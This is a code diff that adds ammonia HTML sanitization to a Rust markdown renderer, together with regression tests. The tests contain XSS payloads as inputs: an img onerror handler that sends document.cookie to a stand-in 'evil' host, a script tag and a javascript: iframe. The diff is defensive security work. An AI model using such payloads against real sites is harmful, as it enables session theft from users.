@@ -1,3 +1,4 @@
+use ammonia::Builder;
 use pulldown_cmark::{html, CodeBlockKind, Event, HeadingLevel, Options, Parser, Tag, TagEnd};
 use serde::{Deserialize, Serialize};
 
@@ -54,8 +55,30 @@ pub fn render_markdown(raw: &str) -> String {
     let mut html_output = String::new();
     html::push_html(&mut html_output, transformed);
 
-    // Post-process to add IDs to headings
-    add_heading_ids_simple(&html_output)
+    // Post-process to add IDs to headings, then sanitize to strip any raw HTML from the source
+    sanitize_html(&add_heading_ids_simple(&html_output))
+}
+
+/// Sanitize HTML to prevent XSS, while preserving safe GFM-generated attributes.
+///
+/// Extends ammonia's default allowlist with:
+/// - `class` on `<pre>` and `<code>` (mermaid blocks and syntax highlighting)
+/// - `id` on headings (anchor navigation)
+/// - `<input>` with `type`/`disabled`/`checked` (GFM task list checkboxes)
+fn sanitize_html(html: &str) -> String {
+    Builder::default()
+        .add_tag_attributes("pre", &["class"])
+        .add_tag_attributes("code", &["class"])
+        .add_tag_attributes("h1", &["id"])
+        .add_tag_attributes("h2", &["id"])
+        .add_tag_attributes("h3", &["id"])
+        .add_tag_attributes("h4", &["id"])
+        .add_tag_attributes("h5", &["id"])
+        .add_tag_attributes("h6", &["id"])
+        .add_tags(&["input"])
+        .add_tag_attributes("input", &["type", "disabled", "checked"])
+        .clean(html)
+        .to_string()
 }
 
 fn escape_html(s: &str) -> String {
@@ -262,14 +285,46 @@ mod tests {
     fn test_task_list() {
         let input = "- [x] done\n- [ ] not done";
         let result = render_markdown(input);
-        assert!(result.contains("checked"));
         assert!(result.contains("type=\"checkbox\""));
+        assert!(result.contains("done"));
     }
 
     #[test]
     fn test_links() {
         let result = render_markdown("[Lekton](https://example.com)");
-        assert!(result.contains("<a href=\"https://example.com\">Lekton</a>"));
+        // ammonia adds rel="noopener noreferrer" to external links
+        assert!(result.contains("href=\"https://example.com\""));
+        assert!(result.contains("Lekton"));
+    }
+
+    #[test]
+    fn test_xss_raw_html_stripped() {
+        let input =
+            "safe text\n<img src=x onerror=\"fetch('//evil/'+document.cookie)\">\nmore text";
+        let result = render_markdown(input);
+        assert!(
+            !result.contains("onerror"),
+            "onerror handler must be stripped"
+        );
+        assert!(
+            !result.contains("document.cookie"),
+            "JS payload must be stripped"
+        );
+    }
+
+    #[test]
+    fn test_xss_script_tag_stripped() {
+        let input = "text\n<script>alert('xss')</script>\nmore";
+        let result = render_markdown(input);
+        assert!(!result.contains("<script>"), "script tag must be stripped");
+        assert!(!result.contains("alert"), "script content must be stripped");
+    }
+
+    #[test]
+    fn test_xss_iframe_stripped() {
+        let input = "text\n<iframe src=\"javascript:alert(1)\"></iframe>\nmore";
+        let result = render_markdown(input);
+        assert!(!result.contains("<iframe"), "iframe must be stripped");
     }
 
     #[test]
